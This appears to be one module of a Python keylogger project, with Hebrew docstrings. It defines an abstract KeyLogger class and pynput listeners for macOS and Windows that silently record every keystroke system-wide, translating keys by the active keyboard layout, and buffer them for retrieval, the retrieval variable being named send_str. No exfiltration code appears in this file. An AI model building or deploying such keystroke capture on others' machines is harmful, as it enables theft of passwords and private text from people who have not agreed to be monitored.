from typing import Any, Callable, Union, Optional
from abc import ABC, abstractmethod
from pynput.keyboard import Listener, Key, KeyCode
import ctypes
import platform
from logger_config import logger
from config import KEY_MAPPINGS
if platform.system() == "Windows":
    user32 = ctypes.windll.user32


class KeyLogger(ABC):
    """
    מחלקת בסיס (Abstract Base Class) המגדירה ממשק כללי למעקב אחר מקשים.
    על כל מחלקה יורשת לממש את המתודות:
    1. start() - להתחלת המעקב.
    2. stop() - לעצירת המעקב.
    3. get_all_keys() - לקבלת כל המידע שנאסף מאז הפעם האחרונה שהמתודה נקראה.
    """

    @abstractmethod
    def start(self) -> None:
        """
        מפעיל/מתחיל את המאזין למקלדת.
        """
        pass

    @abstractmethod
    def stop(self) -> None:
        """
        עוצר את המאזין למקלדת ומשחרר משאבים הקשורים בו.
        """
        pass

    @abstractmethod
    def get_all_keys(self) -> str:
        """
        מחזיר את כל המידע (המקשים שהוקלדו) שנאסף עד כה ומנקה את האגירה הפנימית.

        החזרה:
            str: מחרוזת שמכילה את המקשים שנאספו מאז הקריאה האחרונה למתודה זו.
        """
        pass


class PynputListenerMacOS(KeyLogger):

    def __init__(self) -> None:
        logger.debug("🔹 Initializing macOS key logger.")
        self.listener: Listener = Listener(self.__on_press)
        self.temporary_typing_string: str = str()

    def start(self) -> None:
        logger.info("🔹 Starting macOS key listener.")
        self.listener.start()

    def stop(self) -> None:
        logger.info("🔹 Stopping macOS key listener.")
        self.listener.stop()

    def get_all_keys(self) -> str:
        logger.debug("🔹 Retrieving macOS logged keys.")
        send_str: str = self.temporary_typing_string
        self.temporary_typing_string = str()
        return send_str

    def __on_press(self, key: Any) -> None:
        try:
            key_str: str = key.char if hasattr(key, 'char') and key.char is not None else str(key)
            key_str = KEY_MAPPINGS.get(key_str, key_str)
        except Exception as e:
            logger.error(f"❌ Error in macOS on_press: {e}")
            key_str = "(*unknown_key*)"

        self.temporary_typing_string += key_str


class PynputListenerWindows(KeyLogger):
    def __init__(self) -> None:
        logger.debug("Initializing Windows key logger.")
        self.listener: Listener = Listener(self.__on_press)
        self.temporary_typing_string: str = ""

    def __get_current_keyboard_layout(self) -> int:
        hwnd: int = user32.GetForegroundWindow()
        if hwnd:
            thread_id: int = user32.GetWindowThreadProcessId(hwnd, None)
            return user32.GetKeyboardLayout(thread_id)
        return 0

    def __translate_key(self, vk: int) -> str:
        layout = self.__get_current_keyboard_layout()
        scan = user32.MapVirtualKeyExW(vk, 0, layout)
        buf = ctypes.create_unicode_buffer(8)
        key_state = (ctypes.c_ubyte * 256)()
        if not user32.GetKeyboardState(key_state):
            return ""
        n = user32.ToUnicodeEx(vk, scan, key_state, buf, len(buf), 0, layout)
        return buf.value if n > 0 else "(*unknown_key*)"

    def start(self) -> None:
        logger.info("Starting Windows key listener.")
        self.listener.start()

    def stop(self) -> None:
        logger.info("Stopping Windows key listener.")
        self.listener.stop()

    def get_all_keys(self) -> str:
        logger.debug("Retrieving Windows logged keys.")
        keys: str = self.temporary_typing_string
        self.temporary_typing_string = str()
        return keys

    def __on_press(self, key: Any) -> None:
        try:
            if hasattr(key, 'vk'):
                vk = key.vk
                char = self.__translate_key(vk)
                key_str = char if char else str(key)
            else:
                key_str = str(key)

            key_str = KEY_MAPPINGS.get(key_str, key_str)
        except Exception as e:
            logger.error(f"❌ Error in Windows on_press: {e}")
            key_str = "(*unknown_key*)"
        self.temporary_typing_string += key_str
